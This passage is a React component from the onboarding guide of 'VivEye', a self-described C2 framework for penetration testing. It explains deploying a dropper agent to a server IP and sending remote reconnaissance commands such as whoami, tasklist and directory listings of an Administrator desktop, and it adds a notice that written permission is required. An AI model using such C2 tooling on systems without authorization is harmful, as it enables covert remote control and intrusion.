        <h2 className="text-xl font-semibold text-white mb-4">🚀 Quick Start - Your First 5 Minutes</h2>
        
        <div className="space-y-4">
          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-3">Step 1: Get Your Server IP</h3>
            <p className="text-silver-400 text-sm mb-2">Find your VivEye server's IP address:</p>
            <div className="bg-dark-900 p-3 rounded">
              <code className="text-silver-300">ipconfig</code>
              <span className="text-silver-400 text-sm ml-2">(Windows) or</span>
              <br />
              <code className="text-silver-300">ifconfig</code>
              <span className="text-silver-400 text-sm ml-2">(Linux/macOS)</span>
            </div>
            <p className="text-silver-400 text-sm mt-2">Look for something like <code className="bg-dark-700 px-1 rounded">192.168.1.100</code></p>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-3">Step 2: Deploy Your First Agent</h3>
            <p className="text-silver-400 text-sm mb-2">On another computer (or the same one for testing):</p>
            <ol className="text-silver-400 text-sm space-y-1 ml-4">
              <li>1. Download the appropriate dropper file</li>
              <li>2. Run it and enter your server IP when prompted</li>
              <li>3. Wait for "Connected to VivEye server" message</li>
            </ol>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-3">Step 3: Send Your First Command</h3>
            <p className="text-silver-400 text-sm mb-2">In your VivEye dashboard:</p>
            <ol className="text-silver-400 text-sm space-y-1 ml-4">
              <li>1. Go to the Commands section</li>
              <li>2. Select your agent from the dropdown</li>
              <li>3. Type <code className="bg-dark-700 px-1 rounded">whoami</code></li>
              <li>4. Click "Send Command"</li>
              <li>5. Watch the results appear!</li>
            </ol>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-3">Step 4: Try More Commands</h3>
            <div className="grid md:grid-cols-2 gap-4">
              <div>
                <h4 className="font-medium text-white mb-2">Basic Info</h4>
                <ul className="text-silver-400 text-sm space-y-1">
                  <li>• <code className="bg-dark-700 px-1 rounded">hostname</code> - Computer name</li>
                  <li>• <code className="bg-dark-700 px-1 rounded">systeminfo</code> - System details (Windows)</li>
                  <li>• <code className="bg-dark-700 px-1 rounded">uname -a</code> - System info (Linux/macOS)</li>
                </ul>
              </div>
              <div>
                <h4 className="font-medium text-white mb-2">File Operations</h4>
                <ul className="text-silver-400 text-sm space-y-1">
                  <li>• <code className="bg-dark-700 px-1 rounded">dir</code> - List files (Windows)</li>
                  <li>• <code className="bg-dark-700 px-1 rounded">ls</code> - List files (Linux/macOS)</li>
                  <li>• <code className="bg-dark-700 px-1 rounded">pwd</code> - Current directory</li>
                </ul>
              </div>
            </div>
          </div>

          <div className="bg-dark-800 p-4 rounded-lg">
            <h3 className="font-medium text-white mb-3">Real-World Scenarios</h3>
            <div className="space-y-3">
              <div className="bg-dark-900 p-3 rounded">
                <h4 className="font-medium text-white mb-1">Penetration Testing</h4>
                <p className="text-silver-400 text-sm">"I need to test if I can access sensitive files on the target system"</p>
                <p className="text-silver-400 text-sm">Try: <code className="bg-dark-700 px-1 rounded">dir C:\Users\Administrator\Desktop</code></p>
              </div>
              <div className="bg-dark-900 p-3 rounded">
                <h4 className="font-medium text-white mb-1">Incident Response</h4>
                <p className="text-silver-400 text-sm">"I need to check what processes are running on a compromised machine"</p>
                <p className="text-silver-400 text-sm">Try: <code className="bg-dark-700 px-1 rounded">tasklist /v</code></p>
              </div>
              <div className="bg-dark-900 p-3 rounded">
                <h4 className="font-medium text-white mb-1">Security Research</h4>
                <p className="text-silver-400 text-sm">"I want to understand the network configuration of this system"</p>
                <p className="text-silver-400 text-sm">Try: <code className="bg-dark-700 px-1 rounded">ipconfig /all</code></p>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="card bg-red-900/20 border-red-700">
        <div className="flex items-start space-x-3">
          <AlertCircle className="h-5 w-5 text-red-400 mt-0.5" />
          <div>
            <h3 className="font-medium text-white mb-2">⚠️ Important Safety Notice</h3>
            <p className="text-silver-400 text-sm">
              VivEye is designed for legitimate security testing and research only. 
              Only use it on systems you own or have explicit permission to test. 
              Unauthorized access to computer systems is illegal and unethical.
            </p>
            <p className="text-silver-400 text-sm mt-2">
              <strong>Always get written permission</strong> before testing on any system you don't own.
            </p>
          </div>
        </div>
      </div>
    </div>
  );

  const [activeTab, setActiveTab] = useState('overview');

  const tabs = [
    { id: 'overview', label: 'Overview', icon: Eye },
    { id: 'agents', label: 'Agents', icon: Terminal },
    { id: 'beacons', label: 'Beacons', icon: Monitor },
    { id: 'commands', label: 'Commands', icon: Command },
    { id: 'quickstart', label: 'Quick Start', icon: Zap }
  ];

  return (
    <div className="max-w-6xl mx-auto p-6">
      {/* Header */}
      <div className="text-center mb-8">
        <h1 className="text-4xl font-bold text-white mb-4">Welcome to VivEye</h1>
        <p className="text-silver-400 text-xl">
          A Command & Control (C2) framework for penetration testing and security research
        </p>
      </div>

      {/* Tabs */}
      <div className="flex flex-wrap justify-center mb-8">
        {tabs.map((tab) => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex items-center space-x-2 px-4 py-2 m-1 rounded-lg transition-colors ${
                activeTab === tab.id
                  ? 'bg-primary-600 text-white'
                  : 'bg-dark-800 text-silver-400 hover:bg-dark-700 hover:text-white'
              }`}
            >
              <Icon className="h-4 w-4" />
              <span>{tab.label}</span>
            </button>
          );
        })}
      </div>

      {/* Content */}
      <div className="space-y-6">
        {activeTab === 'overview' && renderOverview()}
        {activeTab === 'agents' && renderAgents()}
        {activeTab === 'beacons' && renderBeacons()}
        {activeTab === 'commands' && renderCommands()}
        {activeTab === 'quickstart' && renderQuickStart()}
      </div>
    </div>
  );
};

export default IntroductionGuide;